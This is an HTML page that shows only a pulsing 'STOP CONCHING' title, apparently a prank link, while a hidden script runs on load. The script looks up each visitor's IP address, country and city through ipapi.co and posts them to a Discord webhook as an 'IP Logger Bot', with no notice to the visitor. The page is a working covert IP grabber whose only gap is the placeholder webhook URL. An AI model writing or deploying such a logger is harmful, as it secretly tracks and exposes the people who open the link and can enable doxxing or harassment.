<!DOCTYPE html>
<html>
<head>
    <title>STOP CONCHING</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        
        .title {
            font-size: 72px;
            text-align: center;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.5); }
            50% { transform: scale(1.5); }
            100% { transform: scale(0.5); }
        }
    </style>
</head>
<body>
    <div class="title">STOP CONCHING</div>

    <script>
        // Function to get visitor's IP and country using ipapi.co
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return {
                    ip: 'Unable to get IP',
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        // Function to send IP to Discord webhook
        async function sendToDiscord(ipInfo) {
            const webhookUrl = 'YOUR_WEBHOOK_URL';
            
            const message = {
                content: `New visitor!\nIP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nCity: ${ipInfo.city}`,
                username: 'IP Logger Bot'
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Execute when page loads
        window.onload = async function() {
            const ipInfo = await getIPInfo();
            await sendToDiscord(ipInfo);
        };
    </script>
</body>
</html>
